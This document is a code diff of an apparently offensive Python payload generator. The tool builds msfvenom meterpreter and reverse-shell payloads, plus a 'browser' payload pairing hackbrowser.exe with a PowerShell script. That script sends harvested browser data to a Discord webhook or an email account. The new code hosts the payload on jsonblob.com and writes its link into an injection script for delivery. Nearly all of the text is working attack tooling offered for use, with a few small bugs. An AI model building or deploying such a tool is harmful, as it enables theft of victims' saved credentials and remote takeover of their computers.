@@ -1,16 +1,10 @@
 #!/usr/bin/env python3
 from subprocess import call, check_call
 from os.path import exists
-from argparse import ArgumentParser
+from os import mkdir
 from shutil import copyfile
-
-argparser = ArgumentParser()
-argparser.add_argument("-pt", "--payload_type", help="The type of payload to generate", type=str, choices=["meterpreter", "shell", "browser"])
-argparser.add_argument("-pp", "--payload_path", help="The path of the payload. (Don't use extensions!)", type=str)
-argparser.add_argument("-lh", "--lhost", help="The IP address to listen on.", type=str)
-argparser.add_argument("-lp", "--lport", help="The port to listen on.", type=str)
-argparser.add_argument("-a", "--auto", help="Automatically start listening.", action="store_true")
-args = argparser.parse_args()
+from requests import request, get, post, put
+from pathlib import Path
 
 banner = """\033[94m
  _______                 __ __    __  ______  _______         ______           __   __             
@@ -34,6 +28,7 @@ def generate_meterpreter(payload_path, LHOST, LPORT):
         print("[!] Could not find msfvenom. Please make sure it is installed and in your PATH!")
         exit(1)
 
+
 def generate_shell(payload_path, LHOST, LPORT):
     """
     Generates a shell payload
@@ -44,96 +39,208 @@ def generate_shell(payload_path, LHOST, LPORT):
         print("[!] Could not find msfvenom. Please make sure it is installed and in your PATH!")
         exit(1)
 
-def generate_browser(payload_path, LHOST, LPORT):
+def generate_browser():
     """
     Generates a browser payload
     """
 
-    if not exists("payloads"):
-        Path("payloads").mkdir()
+    payload_path = get_payload_path("browser")
+    send_method = get_payload_send_method()
+
+    if send_method == "webhook":
+        webhook = get_webhook()
+    elif send_method == "email":
+        email, password = get_email()
+    else:
+        print("[!] Invalid send method")
+        exit(1)
+
+    if payload_path == "payloads/browser":
+        if not exists("payloads"):
+            try:
+                Path("payloads").mkdir()
+            except FileExistsError:
+                pass
+
+   
+        if not exists(payload_path):
+            try:
+                Path(payload_path).mkdir()
+            except FileExistsError:
+                pass
+    else:
+        part_of_path = ""
+        path_parts = Path(path).parts
+        for part in path_parts:
+            part_of_path += part + "/"
+            if not exists(part_of_path):
+                mkdir(part_of_path)
+
+    if not payload_path.endswith("/"):
+        payload_path += "/"
+
+    copyfile("templates/browser/hackbrowser.exe", payload_path + "hackbrowser.exe")
+    if send_method == "webhook":
+        copyfile("templates/browser/payload_webhook.ps1", payload_path + "payload.ps1")
+    else:
+        copyfile("templates/browser/payload_email.ps1", payload_path + "payload.ps1")
+    copyfile("templates/browser/inject.txt", payload_path + "inject.txt")
+
+    f = open(payload_path + "payload.ps1", "r")
+    content = f.read()
+    f.close()
+    f = open(payload_path + "payload.ps1", "w")
+    if send_method == "webhook":
+        content = content.replace("WEBHOOK", webhook)
+        f.write(content)
+    else:
+        f.write(content.replace("MAIL_ADDRESS", email).replace("MAIL_PWD", password).replace("MAIL_TO", email))
+    f.truncate()
+    f.close()
+
+    payload_link = create_payload_link()
     
-    if not exists("payloads/" + payload_path):
-        Path("payloads/browser").mkdir()
+    f = open(payload_path + "inject.txt", "r")
+    content = f.read()
+    f.close()
+    f = open(payload_path + "inject.txt", "w")
+    f.write(content.replace("PAYLOAD_LINK", payload_link))
+    f.truncate()
+    f.close()
 
-    copyfile("templates/browser/hackbrowser.exe", "payloads/browser/hackbrowser.exe")
-    copyfile("templates/browser/payload.ps1", "payloads/browser/payload.ps1")
-    copyfile("templates/browser/inject.txt", "payloads/browser/inject.txt")
+    with open(payload_path + "payload.ps1", "r") as f:
+        content = f.read()
+        put(payload_link, data=content, headers={"Content-Type": "application/json", "Accept": "application/json"})
+        f.close()
 
+    print("[+] Payload generated at: " + payload_path)
+    print("[+] Payload link: " + payload_link)
 
-def generate_payload(payload_path, payload_type, LHOST, LPORT):
+def generate_payload(payload_path="payload", payload_type="browser", LHOST=None, LPORT=None):
     """
     Generates a payload based on the payload_type
     """
 
+    payload_type = get_payload_type()
+
     if payload_type == "meterpreter":
+        check_msfvenom()
+        LHOST = get_LHOST()
+        LPORT = get_LPORT()
         generate_meterpreter(payload_path, LHOST, LPORT)
     elif payload_type == "shell":
+        LHOST = get_LHOST()
+        LPORT = get_LPORT()
+        check_msfvenom()
         generate_shell(payload_path, LHOST, LPORT)
     elif payload_type == "browser":
-        generate_browser(payload_path, LHOST, LPORT)
+        generate_browser()
     else:
         print("[!] Invalid payload type")
         exit(1)
 
-def InitArgs():
-    if args.payload_path:
-        payload_path = args.payload_path
-    else:
-        payload_path = "payload"
+def get_payload_path(payload_type):
+    while True:
+        payload_path = input("[?] Enter the path to the payload: (default:payloads/payload_type) ")
+        if payload_path == "":
+            payload_path = "payloads/" + payload_type
+        break
+    return payload_path
 
-    if args.payload_type:
-        payload_type = args.payload_type
-    else:
-        while True:
-            payload_type = input("[?] What type of payload do you want to generate? (meterpreter, shell, browser): ").lower()
-            if payload_type in ["meterpreter", "shell", "browser"]:
-                break
-            else:
-                print("[!] Invalid payload type")
 
-    if payload_type == "browser":
-        while True:
-            send_method = input("[?] Do you want to receive results as email or discord webhook? (e/W): ").lower()
-        if send_method != "e":
-            send_method = "webhook"
+def get_payload_type():
+    while True:
+        payload_type = input("[?] What type of payload do you want to generate? (meterpreter, shell, browser): ").lower()
+        if payload_type in ["meterpreter", "shell", "browser"]:
+            break
         else:
-            send_method = "email"
+            print("[!] Invalid payload type")
 
-    if send_method == "webhook":
+    return payload_type
+
+def get_payload_send_method():
+    while True:
+        payload_send_method = input("[?] How do you want to send the results? (webhook, email): ").lower()
+        if payload_send_method in ["webhook", "email"]:
+            break
+        else:
+            print("[!] Invalid result send method")
+
+    return payload_send_method
+
+def get_webhook():
+    while True:
+        webhook = input("[?] Enter the webhook URL: ")
+        if (
+                webhook.startswith("https://discordapp.com/api/webhooks/") or 
+                webhook.startswith("https://discord.com/api/webhooks/") or 
+                webhook.startswith("https://canary.discordapp.com/api/webhooks/") or 
+                webhook.startswith("https://canary.discord.com/api/webhooks/")
+            ):
+            break
+        else:
+            print("[!] Invalid webhook URL")
+
+    return webhook
+
+
+def get_email():
+    print("[!] Using emails as a send method, you will need to enable insecure applications in your email provider.")
+    while True:
+        email = input("[?] Enter the email address: ")
+        if "@" in email:
+            break
+        else:
+            print("[!] Invalid email address")
+
+        password = input("[?] Enter the password: ")
+
+    return email, password
+
+def get_LHOST():
+    while True:
+        LHOST = input("[?] Enter the LHOST: ")
+        if "." in LHOST:
+            break
+        else:
+            print("[!] Invalid LHOST")
+
+    return LHOST
+
+def get_LPORT():
+    while True:
+        LPORT = input("[?] Enter the LPORT: ")
+        try:
+            int(LPORT)
+            break
+        except ValueError:
+            print("[!] Invalid LPORT")
+
+    return LPORT
+
+def get_payload_link():
+    gen_payload_link = input("[?] Do you want to generate a link to the payload? (y/n): ")
+    if gen_payload_link != "n":
+        payload_link = create_payload_link()
+    else:
         while True:
-            webhook = input("[?] Enter the webhook URL: ")
-            if (
-                    webhook.startswith("https://discordapp.com/api/webhooks/") or 
-                    webhook.startswith("https://discord.com/api/webhooks/") or 
-                    webhook.startswith("https://canary.discordapp.com/api/webhooks/") or 
-                    webhook.startswith("https://canary.discord.com/api/webhooks/")
-                ):
+            payload_link = input("[?] Enter the link to the payload: ")
+            if payload_link.startswith("https://") or payload_link.startswith("http://"):
                 break
             else:
-                print("[!] Invalid webhook URL")
-    elif send_method == "email":
-        print("[!] Using emails as a send method, you will need to enable insecure applications in your email provider.")
-        while True:
-            email = input("[?] Enter the email address: ")
-            if "@" in email:
-                break
-            else:
-                print("[!] Invalid email address")
+                print("[!] Invalid link")
 
-            password = input("[?] Enter the password: ")
+    return payload_link
 
-    if args.lhost:
-        LHOST = args.lhost
-    else:
-        LHOST = input("[?] What IP address do you want to listen on? : ").lower()
+def create_payload_link():
+    """
+    Creates a link to the payload
+    """
+    # turn this curl request into a python request : # curl -i -X "POST" -d '{"json":["format"]}' -H "Content-Type: application/json" -H "Accept: application/json" https://jsonblob.com/api/jsonBlob
+    post_request = post("https://jsonblob.com/api/jsonBlob", data='{"json": ["format"]}', headers={"Content-Type": "application/json", "Accept": "application/json"}) # thanks you copilot for the help with this one :D
+    payload_link = post_request.headers["location"]
 
-    if args.lport:
-        LPORT = args.port
-    else:
-        LPORT = input("[?] What port do you want to listen on? : ").lower()
-    
-
-    return payload_path, payload_type, LHOST, LPORT, send_method, webhook, email, password
+    return payload_link
 
 def PrintBanner():
     print("\nDeveloped by GamehunterKaan. (https://pwnspot.com)")
@@ -176,12 +283,7 @@ def main():
     Main function
     """
     PrintBanner()
-    check_msfvenom()
-    payload_path, payload_type, LHOST, LPORT, send_method, webhook, email, password = InitArgs()
-    generate_payload(payload_path, payload_type, LHOST, LPORT)
-
-    print("[+] Payload generated successfully!")
-    print("[+] Payload path: payloads/%s/%s" % (payload_type, payload_path))
+    generate_payload()
 
 if __name__ == "__main__":
     main()
